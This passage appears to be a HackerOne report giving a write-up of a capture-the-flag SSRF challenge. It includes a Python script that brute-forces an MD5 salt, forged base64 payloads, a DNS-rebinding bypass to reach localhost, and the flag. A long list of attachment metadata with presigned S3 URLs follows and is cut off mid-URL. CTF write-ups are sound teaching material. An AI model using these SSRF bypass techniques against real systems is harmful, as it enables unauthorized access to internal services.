,\n\n\"We've identified Santa's key servers and loaded them into the attack server ready for you to take down\"\n\nWe're supposed to \"take down the Grinch networks\" in order to get the flag and we need to find a way.\n\nOnce we try to attack the server, the browser sent the request with uniqe hash for each ip.\n```\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==\n\n{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n```\nIf we try to change the target ip to something else like 127.0.0.1,\n```\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=\n\nGot the response\n\n\"Invalid Protection Hash\"\n```\nSo we need to find  out how server identifies the valid hash along with target ip.\n\nI stucked there for hours and falied multiple attempts but finally I fingured it out that there's a salt which is being used to generate valid hash for target ip address.Here's the  code how we can find valid salt.\n```\n#!/usr/bin/python3\nimport hashlib \nfuzz = [line.rstrip('\\n') for line in open('rockyou.txt')]\nfor i in fuzz:\n\t#{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n\t  target =  i + \"203.0.113.33\"\n\t  target_hash = \"5f2940d65ca4140cc18d0878bc398955\"\n\t  generate_hash = hashlib.md5(target.encode())\n\t  md5 = str(generate_hash.hexdigest())\n\t  if target_hash == md5:\n\t  \tprint(\"Here's valid salt: \"+i)\n\t  \tbreak\n```\nIt will take a while and once we get the salt -: mrgrinch463, we can generate valid hash for every ip address.\n\nTried to attack local host 127.0.0.1 but it didnt't success due to restriction.\n\n{F1131257}\n\nBut it's possible to trick the server by using DNS Rebinding technique, after searching a while , found this [rdnr repo](https://github.com/taviso/rbndr) which we can use to bypass.By checking with host cmmand,\n\n7f000001.c0a80001.rbndr.us  resolves  to 127.0.0.1 and 192.168.0.1 randomly.\n\nLet's see does it work.\n```\n{\"target\":\"7f000001.c0a80001.rbndr.us\",\"hash\":\"de9d82d4ae9a61660701e7e1844ea643\"}    \u003e  eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiI2MTQyMmI4MDJhMWQ2ZGRlZDJjZDdhNGNmYTgyYTExMiJ9\n\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9\n```\nBy making above request, once we hit to grinch's local box, we could take down his network completely and got the flag!!!!!\n\n{F1131255}\n\n\u003eFlag 12 -: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\n\n\nThanks for providing awesome ctf, learned a lots.\n\n## Impact\n\n..","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1131245,"file_name":"attackbox-password.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z0tc33mt1fzyf72wqypxktfe84vf?response-content-disposition=attachment%3B%20filename%3D%22attackbox-password.png%22%3B%20filename%2A%3DUTF-8%27%27attackbox-password.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=986b9edb74c53ea31ecf5dec2d8352abc614360756998840717624291664a50b","file_size":281729,"type":"image/png"},{"id":1131246,"file_name":"attackbox-username.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oqfu8feno3ynf3cvrt1ejjzdf6rb?response-content-disposition=attachment%3B%20filename%3D%22attackbox-username.png%22%3B%20filename%2A%3DUTF-8%27%27attackbox-username.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6ca452b0bb1dd757af6a447942c73870c7cdd113abbf88c28ee76118308735c8","file_size":292693,"type":"image/png"},{"id":1131247,"file_name":"Flag_-_7.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zzht8rebjnp1yqdowzcqkhcqur7a?response-content-disposition=attachment%3B%20filename%3D%22Flag_-_7.png%22%3B%20filename%2A%3DUTF-8%27%27Flag_-_7.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=67c78ea42bcc267c567eba7066f49e616d6191a20be19b8473b5863a5c5ffc3d","file_size":49586,"type":"image/png"},{"id":1131248,"file_name":"Flag_-_8.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/29nif1a8gjp2zt27moavwr1cdjey?response-content-disposition=attachment%3B%20filename%3D%22Flag_-_8.png%22%3B%20filename%2A%3DUTF-8%27%27Flag_-_8.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1abf7ce497a95af9c4983ccb261f2589b3e63c4ae0e00103caf83b2e71777e16","file_size":126189,"type":"image/png"},{"id":1131249,"file_name":"Flag-3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4mn5tekqwnkc1sjlhtqvof369t07?response-content-disposition=attachment%3B%20filename%3D%22Flag-3.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=22c37a6021f5e4e764436a48d58a71e63d2c057910b8c0dfa7a980da0597f7a0","file_size":174528,"type":"image/png"},{"id":1131250,"file_name":"Flag-4.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/l1tmao51fgees88tdv9h4j3rgesd?response-content-disposition=attachment%3B%20filename%3D%22Flag-4.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-4.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c45fcf8e3bf55ae43e518b00123ac2533a34177fc1dd929bf3e7048157b459a6","file_size":187290,"type":"image/png"},{"id":1131251,"file_name":"Flag-9.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/du3ntq6sserxia3jipmyy89q4tbo?response-content-disposition=attachment%3B%20filename%3D%22Flag-9.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-9.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=df72902ebd566c7461e6c59eb2cd56e3fe294d5180178dba7cbbe1fab54bc205","file_size":315903,"type":"image/png"},{"id":1131252,"file_name":"Flag-6.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/u5ypefe74jl9qw1nmr9tsjtuua0i?response-content-disposition=attachment%3B%20filename%3D%22Flag-6.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-6.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2BiY8WDpCmp7t5KzvM1us%2F6Eg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=18db3f9bc4c46fc79c90e179e8974c722260e1e35db99afeeb3d4818144a85d4","file_size":383306,"type":"image/png"},{"id":1131253,"file_name":"Flag-10.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fqz8aqsel8n73md6ngkxp7batjqg?response-content-disposition=attachment%3B%20filename%3D%22Flag-10.png%22%3B%20filename%2A%3DUTF-8%27%27Flag-10.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVDBASJ4Q%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132128Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJIMEYCIQDMdOR8DzxdsM%2B6Nk%2BzXUgAoPrxENIVmPciK7W1QkTEBAIhAPZfGsC3rMFHuNTCed2J3zTsoLVhq74QDkDUqwaAjmKbKoMECO3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igws83MXdHvRQdFvESMq1wMqxEsLwoOZjIVt8a3wfYXFAiCeqeu8AhIJ6Q7Gntu36a0%2Blks6a5lEO%2FYz77dG0sIpLYJ92lhokB43YiQ7PkQCfXpRFTl9ereVcz8C%2Ba%2B6ghwT05v12IJECBf189h3nq1I64rxvZIjtN0BImUDg10QomFml6x8R3iLnCYd%2BLAEiGAatULKrnyAIAqUluvo7wOm%2Br90IqmVB75trWkwZcISqhUy3kQvSoTg%2Fsd1zrhvp96u7V9CbvWMDgw50GUylR80KcMhS8pMk07p2NCJVpFXvli9CcdErLq3atydz1iEYs3wmS%2FxGo5ybz%2BFBSBrGAwGQOnYxhYrDiVwepytoLlc0A1YwGzvc%2BhkK7ughwOXGyiEKlYNhpv2iUGk%2FoPAwW9VnMiQ4LHLaf2z%2FxFIC%2FfPgJBsV5dn%2BlvlcrXTNgUone9y6c7%2BBn1eqR2LMzvU8Ycy553Ru%2Fkm%2FBzMexK1Hyt%2Fhdt%2FQQXlD1cuP5rMTD42svdfgSWDAQudumXSmBAH2X7ZE74Gaw2h4JQmynzGH%2FOFS6Lmlo%2Bofjpji8JaNzh4GW2JXmbTgsUVdFELkd37rtrSORTYe8Y8rrt1akUkkcNu6DMm%2FyGhDUPJ%2FxK7RrGHOug4ufna%2BIIw6s%2BQiwY6pAFb0ppMhwpE1Uun0MFKa8So8GqZEnxDHG9kJkScDGktuYxZAg1a2hM6HfHooNOwO3ShyPn3yIRD1SLYdgBYVYgQjezJJsVSMNj3BNuqf0DS%2Bf73xIul9mOcsJPW3HwfDOsCUstdfVvyIllvZucN31%2BOA6uE6BxOAGvrA0Zq5Z%2Fv3289%2BB9Q2%2F0GwwsZ1qBhJjETaZ%2